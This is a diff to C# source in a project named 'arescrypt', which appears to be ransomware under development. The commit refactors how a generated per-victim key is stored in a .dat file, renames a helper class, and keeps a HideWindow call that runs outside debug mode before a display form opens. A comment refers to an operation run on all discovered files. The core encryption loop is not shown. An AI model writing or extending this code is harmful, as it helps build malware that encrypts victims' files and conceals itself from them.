@@ -12,6 +12,7 @@ namespace arescrypt
         public static string sessionUsername = Environment.UserName; // get current sessions username
         static Configuration config = new Configuration(); // New instance of Configuration class
         static Cryptography crypto = new Cryptography(); // New instance of Cryptography class
+        static ServerData serveData = new ServerData();
 
         static void Main(string[] args)
         {
@@ -56,16 +57,18 @@ namespace arescrypt
             
             /* BEGIN ENCRYPTION/DECRYPTION SECTION */
             string encKey = crypto.genRandomString(0xC);
-            config.uniqueKey = encKey;
-            Console.WriteLine("Generated unique id: " + encKey + "\n");
+            serveData.uniqueKey = encKey;
+                        
+            if (!File.Exists(config.datFileLocation))
+                Miscellaneous.SetDATFileData(new ServerData());
+            // Miscellaneous.DisplayDATFileData();
+            Console.WriteLine("Reading dat file...");
+            ServerData serveJSONData = Miscellaneous.GetDATFileData();
+            serveData.uniqueKey = serveJSONData.uniqueKey;
+            Console.WriteLine(serveData.uniqueKey);
 
-            Config conf = new Config();
-            conf.uniqueKey = encKey;
 
-            Misc.SetDATFileData(conf);
-            Misc.DisplayDATFileData();
-
-            Cryptography.executeExample(); // Execute cryptography example
+            // Cryptography.executeExample(); // Execute cryptography example
 
             // Code for operation to run on all discovered files.
             // Remember, application may not have read/write access to all files.
@@ -88,7 +91,7 @@ namespace arescrypt
             }
             else if (!config.debugMode) // == false
             {
-                Misc.HideWindow();
+                Miscellaneous.HideWindow();
                 Application.EnableVisualStyles();
                 Application.SetCompatibleTextRenderingDefault(false);
                 Application.Run(new Display());
